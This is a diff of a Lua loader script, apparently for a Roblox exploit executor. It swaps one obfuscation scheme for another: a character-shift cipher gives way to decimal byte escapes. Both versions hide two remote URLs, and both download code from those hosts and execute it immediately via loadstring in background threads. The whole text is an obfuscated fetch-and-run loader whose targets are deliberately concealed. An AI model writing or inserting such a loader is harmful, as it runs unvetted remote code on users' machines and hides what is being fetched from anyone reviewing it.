@@ -1,15 +1,37 @@
-(function()
-    local e = function(str)
-        return string.gsub(str, ".", function(c) 
-            return string.char(string.byte(c) - 3) 
-        end)
+do
+    local spawnFunc = (task and task.spawn) or spawn or coroutine.wrap
+    local httpGet = function(url)
+        local ok, res = pcall(function() return game:HttpGet(url) end)
+        if ok and type(res) == "string" then return res end
+        if syn and syn.request then
+            local r = syn.request({Url = url, Method = "GET"})
+            if r and r.Body then return r.Body end
+        end
+        if http and http.request then
+            local r = http.request({Url = url, Method = "GET"})
+            if r and r.Body then return r.Body end
+        end
+        error("No HTTP method available.")
     end
-    local u1 = e("kwttsv://itlrk.ghs/illboa")
-    local u2 = e("kwttsv://oxdt.vudfrphqwhqw.frp/Brgdwhv-Vfulsw/Bsgdwhg/uhi/vkhdgv/pdlq/Vfulsw.orb")
-    local f = loadstring
-    local g = game
-    local h = g.HttpGet
-    local s = spawn or task.spawn
-    s(function() f(h(g, u1))() end)
-    s(function() f(h(g, u2))() end)
-end)()
+    local loader = loadstring or load
+
+    local u1 = table.concat({
+        "\104\116\116\112\115\58\47\47",
+        "\108\117\110\111\114\46\100\101\118",
+        "\47\108\111\97\100\101\114"
+    })
+
+    local u2 = table.concat({
+        "\104\116\116\112\115\58\47\47",
+        "\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109",
+        "\47\85\112\100\97\116\101\115\45\83\99\114\105\112\116\47\85\112\100\97\116\101\100",
+        "\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\83\99\114\105\112\116\46\108\117\97"
+    })
+
+    spawnFunc(function()
+        loader(httpGet(u1))()
+    end)
+    spawnFunc(function()
+        loader(httpGet(u2))()
+    end)
+end
